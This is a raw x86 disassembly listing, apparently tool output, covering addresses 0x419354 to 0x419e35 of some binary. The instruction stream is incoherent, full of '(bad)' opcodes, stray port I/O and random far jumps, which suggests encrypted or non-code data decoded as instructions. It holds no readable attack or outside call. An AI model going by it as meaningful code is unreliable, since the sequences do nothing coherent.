  419354:	xor    BYTE PTR [ebx+eax*8+0xf],0x58
  419359:	dec    ecx
  41935a:	into   
  41935b:	push   ds
  41935c:	pushf  
  41935d:	ror    BYTE PTR [ecx+0x5],1
  419360:	push   ds
  419361:	inc    esi
  419362:	mov    ds,WORD PTR [eax]
  419364:	sbb    al,0x8f
  419366:	mov    ch,0x72
  419368:	pushf  
  419369:	jle    0x4192ff
  41936b:	mov    bh,0x7b
  41936d:	add    al,0x12
  41936f:	xor    dl,BYTE PTR [edx+eiz*2+0x3f]
  419373:	mov    ebp,cs
  419375:	jg     0x419313
  419377:	idiv   DWORD PTR [ebx+0x139ee398]
  41937d:	hlt    
  41937e:	test   ecx,ebx
  419380:	xchg   ebx,eax
  419381:	jg     0x4193cd
  419383:	ret    0x7186
  419386:	mov    ss,WORD PTR [ecx+ebx*1]
  419389:	xchg   esp,eax
  41938a:	add    edi,DWORD PTR [esi-0x59a972ea]
  419390:	loopne 0x419361
  419392:	lock shl DWORD PTR [eax+eiz*4-0x44c6fcbe],cl
  41939a:	push   esp
  41939b:	daa    
  41939c:	pop    es
  41939d:	icebp  
  41939e:	jle    0x4193a7
  4193a0:	ror    BYTE PTR [ebx+0x43],0x2d
  4193a4:	sti    
  4193a5:	rcr    ebx,0x92
  4193a8:	inc    ebp
  4193a9:	or     BYTE PTR [ebx-0x16723ca4],0x99
  4193b0:	shl    BYTE PTR [eax-0x23],cl
  4193b3:	test   ebx,ebp
  4193b5:	stos   BYTE PTR es:[edi],al
  4193b6:	shr    DWORD PTR [esi-0x44],cl
  4193b9:	js     0x419378
  4193bb:	and    DWORD PTR [ebx],0xffffffa0
  4193be:	or     BYTE PTR [ecx-0x13],ch
  4193c1:	cmc    
  4193c2:	push   esi
  4193c3:	mov    eax,0x2c27745c
  4193c8:	dec    esp
  4193c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193ca:	mov    ebx,0xa286a568
  4193cf:	push   ebp
  4193d0:	ins    DWORD PTR es:[edi],dx
  4193d1:	push   ss
  4193d2:	pop    ss
  4193d3:	mov    eax,0x3296c22b
  4193d8:	sub    al,0xdf
  4193da:	xchg   esi,eax
  4193db:	mov    edx,0x25975582
  4193e0:	gs jnp 0x419371
  4193e3:	cwde   
  4193e4:	imul   ecx,DWORD PTR [ebx+0x477051f],0x193a59d8
  4193ee:	jns    0x419371
  4193f0:	fdivr  DWORD PTR ds:0xc6a3a9fe
  4193f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193f7:	and    ah,ch
  4193f9:	int    0xb0
  4193fb:	jb     0x41940f
  4193fd:	outs   dx,BYTE PTR ds:[esi]
  4193fe:	mov    ds:0x803ccc7b,al
  419403:	in     eax,dx
  419404:	(bad)  
  419405:	lods   al,BYTE PTR ds:[esi]
  419406:	test   BYTE PTR [edx-0x23],cl
  419409:	jg     0x41944b
  41940b:	imul   esp,DWORD PTR [ebx],0xff21be96
  419411:	popa   
  419412:	mov    dl,0x31
  419414:	or     edi,esp
  419416:	fsubr  DWORD PTR [edi+0x6f]
  419419:	loopne 0x4193e5
  41941b:	int    0x96
  41941d:	leave  
  41941e:	pop    esi
  41941f:	sbb    bl,0x4a
  419422:	or     eax,0xbbb32a17
  419427:	mov    ch,0x72
  419429:	out    0xb5,eax
  41942b:	sub    ch,bh
  41942d:	mov    dl,0x58
  41942f:	in     al,0x23
  419431:	adc    BYTE PTR [ebx+0x631e03e7],dl
  419437:	or     eax,0xd08af4c6
  41943c:	add    BYTE PTR [edx],ch
  41943e:	aas    
  41943f:	sub    al,0xdb
	...
  4194b1:	add    BYTE PTR [eax],al
  4194b3:	add    BYTE PTR [ecx-0x7],al
  4194b6:	mov    ebx,ebx
  4194b8:	mov    ebx,0x95fb51fb
  4194bd:	fidivr WORD PTR [ebx+0x2c]
  4194c0:	ins    BYTE PTR es:[edi],dx
  4194c1:	and    BYTE PTR [edi+edi*1-0x79],ch
  4194c5:	adc    al,BYTE PTR [ecx]
  4194c7:	add    ch,dh
  4194c9:	add    BYTE PTR [eax],al
  4194cb:	add    BYTE PTR [eax-0x36ed79ad],ch
  4194d1:	sub    al,0x36
  4194d3:	hlt    
  4194d4:	jbe    0x4194fe
  4194d6:	dec    esp
  4194d7:	mov    BYTE PTR [ecx+0x65],al
  4194da:	jmp    DWORD PTR [ecx]
  4194dc:	mov    ebx,0xf53e7cc0
  4194e1:	fdivr  st(6),st
  4194e3:	cli    
  4194e4:	cmp    eax,0xe3b5faa2
  4194e9:	jo     0x419523
  4194eb:	dec    edi
  4194ec:	mov    al,ds:0xc65a8ef2
  4194f1:	retf   
  4194f2:	out    dx,al
  4194f3:	jmp    0x256914f4
  4194f8:	loopne 0x4194c7
  4194fa:	fild   WORD PTR [edx-0x17]
  4194fd:	in     eax,0xba
  4194ff:	jb     0x4194e8
  419501:	mov    dl,0x5b
  419503:	lock ror dh,1
  419506:	mov    fs,WORD PTR [edi+0x2f]
  419509:	cmp    BYTE PTR [esi-0xe375988],dl
  41950f:	adc    BYTE PTR [esi-0x4],dl
  419512:	or     ch,cl
  419514:	not    DWORD PTR [ebp+0x58]
  419517:	sub    DWORD PTR [esi-0x67],0x1f874497
  41951e:	adc    dl,BYTE PTR es:[esi]
  419521:	into   
  419522:	mov    ?,esi
  419524:	out    0x8c,eax
  419526:	out    0x2e,eax
  419528:	mov    bh,0x5d
  41952a:	push   edx
  41952b:	pop    ebx
  41952c:	call   0x5a88:0xad9b5d14
  419533:	jecxz  0x419512
  419535:	call   0x425d:0xc879829b
  41953c:	inc    edx
  41953d:	addr16 out 0xbc,eax
  419540:	int    0x8e
  419542:	mov    dl,ah
  419544:	ud0    ebp,DWORD PTR [eax+0x439d7cf2]
  41954b:	das    
  41954c:	xor    eax,0xd9bb80e6
  419551:	and    eax,0xbe8c14a0
  419556:	(bad)  
  419557:	mov    ebp,0x97c29cea
  41955c:	fwait
  41955d:	add    edi,ebp
  41955f:	add    DWORD PTR [eax],ebx
  419561:	jge    0x419583
  419563:	lods   al,BYTE PTR ds:[esi]
  419564:	mov    eax,0xf96c4bfd
  419569:	cmc    
  41956a:	sbb    ecx,DWORD PTR [ebp+edi*8-0x39]
  41956e:	ja     0x4195d8
  419570:	mov    dl,0x9a
  419572:	jp     0x419575
  419574:	in     al,dx
  419575:	loopne 0x419591
  419577:	lods   al,BYTE PTR ds:[esi]
  419578:	sub    al,0x61
  41957a:	mov    BYTE PTR [edi-0x17],dl
  41957d:	loope  0x4195d3
  41957f:	or     eax,0x2ec03e1c
  419584:	loop   0x41954b
  419586:	icebp  
  419587:	fistp  WORD PTR gs:[eax]
  41958a:	sti    
  41958b:	add    BYTE PTR [ebx],bl
  41958d:	or     dh,BYTE PTR ds:0xba51266b
  419593:	test   DWORD PTR [ebp+0x1edc3c65],0x308e984a
  41959d:	mov    BYTE PTR [eax],bh
  41959f:	jmp    0x46f9eaba
  4195a4:	jns    0x419590
  4195a6:	pop    edx
  4195a7:	hlt    
  4195a8:	(bad)  
  4195aa:	lea    ebp,[ebp+0xd]
  4195ad:	(bad)  
  4195af:	outs   dx,DWORD PTR ds:[esi]
  4195b0:	mov    ebp,0xa5c8802f
  4195b5:	sbb    al,0x9f
  4195b7:	(bad)  
  4195b8:	and    al,0xd
  4195ba:	retf   
  4195bb:	add    BYTE PTR [ebx+0x3c],0x72
  4195bf:	ins    DWORD PTR es:[edi],dx
  4195c0:	fwait
	...
  419631:	add    BYTE PTR [eax],al
  419633:	add    BYTE PTR [ebx-0x44c35fd8],dl
  419639:	mov    esp,0xad76af9f
  41963e:	or     esp,DWORD PTR [eax+0x4dd9c71c]
  419644:	jl     0x419659
  419646:	add    DWORD PTR [eax],eax
  419648:	cmc    
  419649:	add    BYTE PTR [eax],al
  41964b:	add    BYTE PTR [edi-0xd758322],bl
  419651:	xor    bh,BYTE PTR [edi+0x22ed748a]
  419657:	and    eax,0x158bb92b
  41965c:	or     BYTE PTR [ebx+0x60],cl
  41965f:	(bad)  
  419660:	stos   DWORD PTR es:[edi],eax
  419661:	hlt    
  419662:	xchg   esi,eax
  419663:	push   ds
  419664:	jge    0x4196cd
  419666:	setp   BYTE PTR [ecx+0x39b5dfd8]
  41966d:	iret   
  41966e:	adc    al,0xf9
  419670:	mov    eax,ds:0x9baff808
  419675:	or     cl,dl
  419677:	and    esi,DWORD PTR [esi]
  419679:	into   
  41967a:	jp     0x4196c5
  41967c:	push   ss
  41967d:	jge    0x4196db
  41967f:	repnz xchg esp,eax
  419681:	add    DWORD PTR [edx-0x62437279],edx
  419687:	cmp    al,0xa8
  419689:	xor    eax,0x9c6cd070
  41968e:	jg     0x419619
  419690:	in     al,dx
  419691:	into   
  419692:	inc    ebx
  419693:	loop   0x419672
  419695:	jecxz  0x41970d
  419697:	sub    eax,0x31179ae2
  41969c:	dec    esi
  41969d:	cmp    BYTE PTR [ecx],al
  41969f:	mov    esp,ss
  4196a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196a2:	je     0x41971e
  4196a4:	jbe    0x419661
  4196a6:	or     al,0xd9
  4196a8:	stc    
  4196a9:	arpl   dx,cx
  4196ab:	cwde   
  4196ac:	inc    ebx
  4196ad:	fisttp WORD PTR [ebp+edx*4-0x3e51c74e]
  4196b4:	repz pop esi
  4196b6:	mov    DWORD PTR [ebx-0x3d],esi
  4196b9:	test   eax,0x163258eb
  4196be:	bound  eax,QWORD PTR [ebx]
  4196c0:	mov    ebp,0x81455082
  4196c5:	sbb    eax,0xd53c97ba
  4196ca:	inc    esp
  4196cb:	pusha  
  4196cc:	sbb    ah,bl
  4196ce:	out    dx,al
  4196cf:	add    al,ah
  4196d1:	hlt    
  4196d2:	push   ds
  4196d3:	ja     0x4196fe
  4196d5:	stos   BYTE PTR es:[edi],al
  4196d6:	mov    bl,ah
  4196d8:	fdivr  DWORD PTR [ebp+0x50]
  4196db:	test   ah,al
  4196dd:	(bad)  
  4196de:	mov    edi,esp
  4196e0:	adc    DWORD PTR [ebp-0x78],esp
  4196e3:	popa   
  4196e4:	cmp    dl,ah
  4196e6:	loopne 0x41970b
  4196e8:	dec    ebx
  4196e9:	in     al,dx
  4196ea:	mov    ds:0x78c21997,eax
  4196ef:	inc    esi
  4196f0:	xchg   ebp,eax
  4196f1:	cmp    DWORD PTR [ecx-0x4aff4037],edx
  4196f7:	jmp    0x6728:0xe90b36bd
  4196fe:	mov    edx,0xc89e0bb2
  419703:	mov    esp,0xedf23b11
  419708:	cmp    BYTE PTR [eax-0x29cfaa47],dh
  41970e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41970f:	lods   eax,DWORD PTR ds:[esi]
  419710:	inc    ebp
  419711:	nop
  419712:	mov    DWORD PTR [ecx-0x42],esi
  419715:	push   0xffffffd8
  419717:	iret   
  419718:	fcomp  DWORD PTR [ecx+0x1b]
  41971b:	cmp    al,0xf3
  41971d:	std    
  41971e:	ret    
  41971f:	dec    ebp
  419720:	mov    ebx,0x449aecca
  419725:	add    eax,edi
  419727:	(bad)
  41972a:	mov    ?,WORD PTR ss:[edx+0x3d]
  41972e:	fs retf 0x8dc4
  419732:	leave  
  419733:	rcr    BYTE PTR [ebp+0x7a70c24],cl
  419739:	test   al,0x8e
  41973b:	int    0xc5
  41973d:	ret    
  41973e:	mov    ebx,0xab0f
	...
  4197b3:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  4197ba:	hlt    
  4197bb:	fist   WORD PTR [ecx+0x6b27cbe9]
  4197c1:	dec    eax
  4197c2:	inc    esp
  4197c3:	inc    ebx
  4197c4:	jno    0x4197da
  4197c6:	add    DWORD PTR [eax],eax
  4197c8:	cmc    
  4197c9:	add    BYTE PTR [eax],al
  4197cb:	add    BYTE PTR [eax],bh
  4197cd:	ja     0x419814
  4197cf:	cdq    
  4197d0:	mov    eax,0x37495e03
  4197d5:	adc    dl,BYTE PTR [edi-0x1d0509c4]
  4197db:	scas   eax,DWORD PTR es:[edi]
  4197dc:	gs push edi
  4197de:	cmp    BYTE PTR [edi+edi*8],dh
  4197e1:	mov    bl,0xa1
  4197e3:	xor    ah,BYTE PTR [edx+edi*1+0x11]
  4197e7:	mov    es,esp
  4197e9:	jae    0x4197cd
  4197eb:	sbb    eax,0x93c844a2
  4197f0:	mov    esi,0x956bd832
  4197f5:	popa   
  4197f6:	int3   
  4197f7:	cmp    DWORD PTR [edx-0x75],edi
  4197fa:	out    dx,al
  4197fb:	jo     0x4197bd
  4197fd:	hlt    
  4197fe:	jnp    0x4197f6
  419800:	adc    eax,DWORD PTR [edi+0x2e]
  419803:	and    ebx,DWORD PTR [ecx+edi*1-0x21]
  419807:	lods   al,BYTE PTR ds:[esi]
  419808:	loopne 0x4197d8
  41980a:	mov    cl,0x9d
  41980c:	test   BYTE PTR [edi],0xf6
  41980f:	xor    eax,0xdbb13a53
  419814:	jmp    0x419833
  419816:	mov    gs,WORD PTR [edi]
  419818:	jae    0x4197e2
  41981a:	adc    esi,edi
  41981c:	jae    0x4197e8
  41981e:	(bad)  
  41981f:	fiadd  DWORD PTR [eax]
  419821:	add    eax,0x291434d8
  419826:	scas   eax,DWORD PTR es:[edi]
  419827:	dec    esp
  419828:	jnp    0x4197f1
  41982a:	call   0x93409b8c
  41982f:	jnp    0x4197d4
  419831:	push   ecx
  419832:	cs jecxz 0x41983e
  419835:	in     al,0xbf
  419837:	imul   ebp,DWORD PTR [ebx-0x6c],0x63
  41983b:	sub    eax,0x91efb00b
  419840:	outs   dx,DWORD PTR ds:[esi]
  419841:	(bad)  
  419843:	dec    ebx
  419844:	sub    DWORD PTR [edx+edx*4+0x20],edi
  419848:	test   DWORD PTR [eax-0x289a2c3f],ecx
  41984e:	adc    eax,0x6d47a57
  419853:	mov    esp,DWORD PTR [ebp-0x4b]
  419856:	and    BYTE PTR [edx],0x15
  419859:	push   ebp
  41985a:	arpl   WORD PTR [edi],bp
  41985c:	loope  0x41985e
  41985e:	mov    eax,ds:0xbcc7ff09
  419863:	stos   BYTE PTR es:[edi],al
  419864:	lock jae 0x41983b
  419867:	xor    esi,DWORD PTR [esi-0x75]
  41986a:	sbb    bh,ah
  41986c:	jge    0x419897
  41986e:	and    edi,DWORD PTR [ebx]
  419870:	xchg   esi,eax
  419871:	dec    edx
  419872:	xor    DWORD PTR [ebx+edi*1-0x4c],ebx
  419876:	imul   ebx,DWORD PTR [ebx-0x3e],0xc913ee41
  41987d:	ja     0x419891
  41987f:	lds    ecx,FWORD PTR [esi-0x3c64616]
  419885:	int    0x6
  419887:	push   ds
  419888:	aaa    
  419889:	pop    edi
  41988a:	push   ebx
  41988b:	mov    ch,0x9e
  41988d:	push   ds
  41988e:	and    ah,BYTE PTR [edi-0x33a35e0]
  419894:	addr16 out dx,al
  419896:	mov    al,ds:0xe2dadbbe
  41989b:	std    
  41989c:	cmp    DWORD PTR cs:0xc01b4d18,esp
  4198a3:	mov    dh,0x56
  4198a5:	jbe    0x4198c8
  4198a7:	in     al,dx
  4198a8:	and    esp,0xa425046
  4198ae:	cld    
  4198af:	mov    al,ds:0x274ecee5
  4198b4:	xchg   ecx,eax
  4198b5:	push   ecx
  4198b6:	retf   0x755a
  4198b9:	xchg   al,ah
  4198bb:	stc    
  4198bc:	pop    ecx
  4198bd:	imul   edx,edi,0xd4c4
	...
  419933:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  41993a:	into   
  41993b:	fwait
  41993c:	test   BYTE PTR [ecx-0x28],0x94
  419940:	pop    esi
  419941:	push   0xffffff88
  419943:	jg     0x4199ab
  419945:	adc    eax,0xf50001
  41994a:	add    BYTE PTR [eax],al
  41994c:	popf   
  41994d:	les    edi,FWORD PTR [eax-0x4a99b25f]
  419953:	jnp    0x419950
  419955:	mov    cl,al
  419957:	push   ebp
  419958:	mov    cl,0x97
  41995a:	mov    bh,0x8d
  41995c:	ja     0x419977
  41995e:	ret    
  41995f:	jp     0x4199b9
  419961:	(bad)  
  419962:	(bad)  
  419963:	aas    
  419964:	add    ebp,ebp
  419966:	fcmovnb st,st(6)
  419968:	lock test eax,0xac3debd9
  41996e:	and    al,0x56
  419970:	test   BYTE PTR [ebp-0x31],dl
  419973:	es in  eax,dx
  419975:	mov    edi,0xe6209aaf
  41997a:	push   cs
  41997b:	dec    ecx
  41997c:	xchg   ch,ch
  41997e:	mov    ebp,DWORD PTR [ebp+0x5d]
  419981:	jbe    0x4199bc
  419983:	cld    
  419984:	pop    eax
  419985:	mov    ch,0x3e
  419987:	push   ecx
  419988:	call   0xc1ce:0x9a193f46
  41998f:	enter  0xa5f6,0x8a
  419993:	enter  0x65c5,0x4b
  419997:	in     al,0x2
  419999:	in     eax,0x83
  41999b:	aas    
  41999c:	add    DWORD PTR [ecx],esi
  41999e:	xor    DWORD PTR [edi],edx
  4199a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199a1:	jbe    0x419a15
  4199a3:	add    al,BYTE PTR [ebp+0x7ad34ae4]
  4199a9:	inc    edi
  4199aa:	pop    ebp
  4199ab:	pop    esp
  4199ac:	call   0x574a:0xf6119c2c
  4199b3:	scas   al,BYTE PTR es:[edi]
  4199b4:	outs   dx,BYTE PTR ds:[esi]
  4199b5:	mov    BYTE PTR [eax],cl
  4199b7:	mov    ch,0x68
  4199b9:	push   0xffffffef
  4199bb:	daa    
  4199bc:	jg     0x4199d6
  4199be:	inc    esp
  4199bf:	mov    ebx,0xe2f31bb8
  4199c4:	adc    DWORD PTR [esi],eax
  4199c6:	ror    dl,cl
  4199c8:	test   BYTE PTR [eax+0x47],ch
  4199cb:	ins    BYTE PTR es:[edi],dx
  4199cc:	(bad)  
  4199cd:	push   ebx
  4199ce:	stos   BYTE PTR es:[edi],al
  4199cf:	dec    ebp
  4199d0:	not    bh
  4199d2:	aaa    
  4199d3:	fld    QWORD PTR [ecx+0x8102a7]
  4199d9:	xchg   ebx,eax
  4199da:	xchg   edi,eax
  4199db:	and    ch,BYTE PTR [esi-0x204e91c]
  4199e1:	inc    esi
  4199e2:	adc    DWORD PTR ds:0x8e41d172,0x7b327641
  4199ec:	add    esi,DWORD PTR [edi+0x1a]
  4199ef:	stos   DWORD PTR es:[edi],eax
  4199f0:	mov    ds:0xe4bb0f12,al
  4199f5:	inc    eax
  4199f6:	jmp    0xfee57578
  4199fb:	inc    eax
  4199fc:	clc    
  4199fd:	xchg   DWORD PTR [edx],eax
  4199ff:	aad    0x83
  419a01:	adc    edx,DWORD PTR [edi]
  419a03:	xchg   ecx,eax
  419a04:	add    esi,DWORD PTR [ebx+0x57]
  419a07:	jb     0x41999e
  419a09:	rol    BYTE PTR [ebx-0x4437467],cl
  419a0f:	adc    eax,0xe995493c
  419a14:	das    
  419a15:	dec    ebp
  419a16:	rcl    cl,0x8f
  419a19:	in     al,0x54
  419a1b:	loope  0x4199e7
  419a1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a1e:	adc    al,0x7e
  419a20:	stc    
  419a21:	or     edi,DWORD PTR [edx-0x79]
  419a24:	fcomp  QWORD PTR [ebx]
  419a26:	out    dx,eax
  419a27:	mov    eax,ds:0xb45eaf12
  419a2c:	lahf   
  419a2d:	fs mov ebx,0xead934cb
  419a33:	neg    DWORD PTR [ecx-0x4a81ab35]
  419a39:	rcl    DWORD PTR [edx+eax*1-0x31a2038c],1
  419a40:	dec    ebx
	...
  419ab1:	add    BYTE PTR [eax],al
  419ab3:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  419ab7:	xor    ch,bh
  419ab9:	mov    dh,0xff
  419abb:	pop    edi
  419abc:	mov    ebp,0x66357b47
  419ac1:	pop    es
  419ac2:	out    dx,eax
  419ac3:	pop    ebx
  419ac4:	pop    ebx
  419ac5:	push   ss
  419ac6:	add    DWORD PTR [eax],eax
  419ac8:	cmc    
  419ac9:	add    BYTE PTR [eax],al
  419acb:	add    BYTE PTR [eax+0x39638093],dh
  419ad1:	test   eax,0x31dcf920
  419ad6:	iret   
  419ad7:	xor    eax,0x65b53eaf
  419adc:	jnp    0x419ac2
  419ade:	pop    eax
  419adf:	mov    ?,WORD PTR [eax+0x59]
  419ae2:	lods   eax,DWORD PTR ds:[esi]
  419ae3:	les    ebx,FWORD PTR [esi-0x74]
  419ae6:	idiv   BYTE PTR [ebx+0x7e93a762]
  419aec:	push   edi
  419aed:	sub    dh,dh
  419aef:	gs ds scas al,BYTE PTR es:[edi]
  419af2:	inc    DWORD PTR [eax+0x1489885c]
  419af8:	es ret 0xa370
  419afc:	(bad)  
  419afd:	mov    ch,0x77
  419aff:	cmp    esi,ebp
  419b01:	mov    cl,BYTE PTR es:[ecx-0x5cf5e05d]
  419b08:	arpl   WORD PTR [ebp-0x7dbc11bc],dx
  419b0e:	jge    0x419b21
  419b10:	dec    ebx
  419b11:	add    DWORD PTR [esi-0xd],edx
  419b14:	pop    edx
  419b15:	mov    esp,0x9febac41
  419b1a:	sub    DWORD PTR [ebx-0x2f],edx
  419b1d:	jno    0x419ac9
  419b1f:	xchg   edx,eax
  419b20:	or     al,0x2
  419b22:	mov    ebp,0x69a7d62c
  419b27:	push   ebx
  419b28:	xchg   edx,eax
  419b29:	(bad)  
  419b2a:	and    dl,bh
  419b2c:	mov    esp,0x6ced9b6
  419b31:	cmp    DWORD PTR [ecx+eiz*8],ebx
  419b34:	lea    ebp,[bp+0x18]
  419b38:	sti    
  419b39:	push   cs
  419b3a:	adc    ah,BYTE PTR [edi]
  419b3c:	add    al,0x1d
  419b3e:	stc    
  419b3f:	sub    eax,0xaf39ba16
  419b44:	clc    
  419b45:	mov    esp,0x2756317a
  419b4a:	jmp    0x4241:0x6a53cea7
  419b51:	(bad)  
  419b52:	out    0x6c,eax
  419b54:	(bad)  
  419b55:	out    dx,al
  419b56:	inc    esp
  419b57:	nop
  419b58:	inc    eax
  419b59:	lea    eax,[ecx+eax*2+0x350bc563]
  419b60:	fidiv  WORD PTR [ebp-0x4263f515]
  419b66:	mov    ch,0xa5
  419b68:	stc    
  419b69:	scas   eax,DWORD PTR es:[edi]
  419b6a:	push   eax
  419b6b:	pop    ds
  419b6c:	or     cl,BYTE PTR [ebx+0x4d8b6203]
  419b72:	enter  0xe0f7,0xaf
  419b76:	mov    es,WORD PTR [ecx-0x7f]
  419b79:	sbb    BYTE PTR [esi],bl
  419b7b:	int3   
  419b7c:	push   ebp
  419b7d:	pop    edx
  419b7e:	enter  0xd9fe,0x3d
  419b82:	jl     0x419b89
  419b84:	xor    al,0x69
  419b86:	push   ebx
  419b87:	xor    al,0x9a
  419b89:	pop    ebp
  419b8a:	fst    DWORD PTR [esi]
  419b8c:	inc    ebx
  419b8d:	mov    ?,eax
  419b8f:	adc    al,0x39
  419b91:	and    esp,edi
  419b93:	lahf   
  419b94:	retf   
  419b95:	aaa    
  419b96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b97:	cdq    
  419b98:	pop    ebp
  419b99:	and    al,0x14
  419b9b:	add    eax,0xd13f9ae9
  419ba0:	mov    edi,0xf88b669b
  419ba5:	mov    eax,ds:0x4f6f33d2
  419baa:	push   ebx
  419bab:	mov    ds,ebx
  419bad:	aaa    
  419bae:	pop    esp
  419baf:	int    0xb6
  419bb1:	push   ds
  419bb2:	mov    eax,ds:0x8c795ed7
  419bb7:	add    DWORD PTR [ebx-0xb],edi
  419bba:	mov    ah,0xe0
  419bbc:	iret   
  419bbd:	bnd jo 0x419c1d
  419bc0:	lods   al,BYTE PTR ds:[esi]
	...
  419c31:	add    BYTE PTR [eax],al
  419c33:	add    bl,bh
  419c35:	inc    edx
  419c36:	out    dx,al
  419c37:	aas    
  419c38:	(bad)  
  419c39:	mov    edi,0x157c6fb
  419c3e:	sub    esi,0xffffffb7
  419c41:	jns    0x419bd1
  419c43:	cmp    BYTE PTR [eax+0x17],dl
  419c46:	add    DWORD PTR [eax],eax
  419c48:	cmc    
  419c49:	add    BYTE PTR [eax],al
  419c4b:	add    BYTE PTR [ebp-0x37],dl
  419c4e:	(bad)  
  419c4f:	cli    
  419c50:	pop    es
  419c51:	out    dx,eax
  419c52:	xchg   edx,eax
  419c53:	lods   eax,DWORD PTR ds:[esi]
  419c54:	jp     0x419bff
  419c56:	pop    ebx
  419c57:	outs   dx,DWORD PTR ds:[esi]
  419c58:	pushf  
  419c59:	ja     0x419c3f
  419c5b:	cwde   
  419c5c:	(bad)  
  419c5e:	mov    ah,0x76
  419c60:	jnp    0x419c67
  419c62:	fucom  st(4)
  419c64:	xchg   edx,eax
  419c65:	pop    edi
  419c66:	xor    eax,0xe5bd3ec1
  419c6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c6c:	rcl    DWORD PTR [eax+0x1f22ff03],cl
  419c72:	xlat   BYTE PTR ds:[ebx]
  419c73:	or     eax,0x2e3e23fe
  419c78:	and    al,0x7
  419c7a:	mov    ecx,0x65f42110
  419c7f:	jno    0x419c3a
  419c81:	push   esi
  419c82:	imul   esi,DWORD PTR [ecx-0x562c331e],0xa0590810
  419c8c:	pop    ds
  419c8d:	jns    0xa8d0010e
  419c93:	mov    ecx,0xc0fe41d9
  419c98:	in     eax,dx
  419c99:	(bad)  ds:0x6a5a9d9
  419c9f:	test   eax,0x171c8bb0
  419ca4:	xchg   esp,eax
  419ca5:	aas    
  419ca6:	sbb    eax,0x41cb43c9
  419cab:	rol    DWORD PTR [edx-0x78fab6cb],cl
  419cb1:	adc    DWORD PTR [eax-0x3d4896e],edi
  419cb7:	retf   0xe626
  419cba:	repnz fdiv QWORD PTR [eax+ebp*8-0x4180839f]
  419cc2:	sar    BYTE PTR [esi-0x7a39e2bf],cl
  419cc8:	int    0xbe
  419cca:	adc    al,0xa8
  419ccc:	mov    es:0xe1d9895a,al
  419cd2:	lods   eax,DWORD PTR ds:[esi]
  419cd3:	pop    esp
  419cd4:	data16 outs dx,BYTE PTR ds:[esi]
  419cd6:	jne    0x419c5d
  419cd8:	sbb    cl,BYTE PTR [ecx-0x4102f55f]
  419cde:	mov    ah,0x24
  419ce0:	xchg   edi,eax
  419ce1:	out    0x41,al
  419ce3:	jae    0x419c77
  419ce5:	pop    ebp
  419ce6:	in     eax,0x59
  419ce8:	sti    
  419ce9:	inc    esi
  419cea:	cmc    
  419ceb:	mov    ebp,0xc2e9483c
  419cf0:	push   ebp
  419cf1:	fisub  DWORD PTR [ecx-0x5c]
  419cf4:	or     BYTE PTR [esp+esi*8-0x11],bh
  419cf8:	dec    BYTE PTR [edi-0x9]
  419cfb:	jmp    0x419c9c
  419cfd:	sbb    al,0xc7
  419cff:	and    al,0x9b
  419d01:	pop    ebp
  419d02:	pop    ecx
  419d03:	out    0x73,eax
  419d05:	stc    
  419d06:	jmp    0x4417:0x82d246d4
  419d0d:	pop    ebp
  419d0e:	sti    
  419d0f:	inc    esi
  419d10:	cmp    al,0xdc
  419d12:	sar    DWORD PTR [esi-0x68],cl
  419d15:	cmc    
  419d16:	add    BYTE PTR [esi],al
  419d18:	es and eax,0x84355e70
  419d1e:	out    0x67,al
  419d20:	mov    ch,0x96
  419d22:	xor    eax,0x933fc9cf
  419d27:	enter  0x1d83,0xc3
  419d2b:	pop    edx
  419d2c:	xchg   edx,eax
  419d2d:	scas   eax,DWORD PTR es:[edi]
  419d2e:	mov    ebp,0x3498ec96
  419d33:	sub    al,0x98
  419d35:	scas   al,BYTE PTR es:[edi]
  419d36:	fnstsw WORD PTR [edi]
  419d38:	inc    esp
  419d39:	out    dx,eax
  419d3a:	mov    bh,0x69
  419d3c:	loop   0x419d4f
  419d3e:	pushf  
  419d3f:	pop    ebx
  419d40:	fiadd  WORD PTR [eax]
	...
  419db2:	add    BYTE PTR [eax],al
  419db4:	push   cs
  419db5:	bnd call 0xde7c99eb
  419dbb:	(bad)  
  419dbc:	jp     0x419e27
  419dbe:	xchg   edi,eax
  419dbf:	inc    esp
  419dc0:	and    al,0xcd
  419dc2:	jp     0x419def
  419dc4:	inc    ebp
  419dc5:	sbb    BYTE PTR [ecx],al
  419dc7:	add    ch,dh
  419dc9:	add    BYTE PTR [eax],al
  419dcb:	add    BYTE PTR [esi],ah
  419dcd:	(bad)  
  419dce:	jmp    edx
  419dd0:	pop    edi
  419dd1:	cld    
  419dd2:	pop    edi
  419dd3:	mov    BYTE PTR [esi+0x2b40b69c],dl
  419dd9:	jo     0x419d5d
  419ddb:	pop    ebx
  419ddc:	popf   
  419ddd:	mov    eax,0x90046997
  419de2:	(bad)  
  419de3:	shr    BYTE PTR [eax+0x55],1
  419de6:	loop   0x419dcb
  419de8:	dec    edx
  419de9:	rcr    bl,0xcc
  419dec:	push   ebp
  419ded:	xor    DWORD PTR [edx+0x5],ebx
  419df0:	mov    bl,0xb6
  419df2:	mov    esp,0x60c5f548
  419df7:	pusha  
  419df8:	jp     0x419dac
  419dfa:	jmp    0x419e7b
  419dfc:	sbb    bl,BYTE PTR [esi-0x2f]
  419dff:	jecxz  0x419e06
  419e01:	dec    esi
  419e02:	(bad)  
  419e04:	mov    WORD PTR [edx+0x1f],cs
  419e07:	(bad)  
  419e08:	adc    al,0xf8
  419e0a:	sbb    bl,bl
  419e0c:	cmp    esp,DWORD PTR [ebx]
  419e0e:	js     0x419d9b
  419e10:	imul   ebp,DWORD PTR [edi-0x49],0xba3941fc
  419e17:	iret   
  419e18:	jns    0x419ddf
  419e1a:	test   BYTE PTR [edx-0x7f],0x3c
  419e1e:	push   ebx
  419e1f:	sbb    eax,0xc4b5b9
  419e24:	add    bl,al
  419e26:	shl    BYTE PTR [ebx-0x2418d780],0x8b
  419e2d:	sbb    eax,0xf6cf2f1d
  419e32:	xchg   ecx,eax
  419e33:	mov    ch,0xf3
  419e35:	mov    ds:0x4c2f45b,al
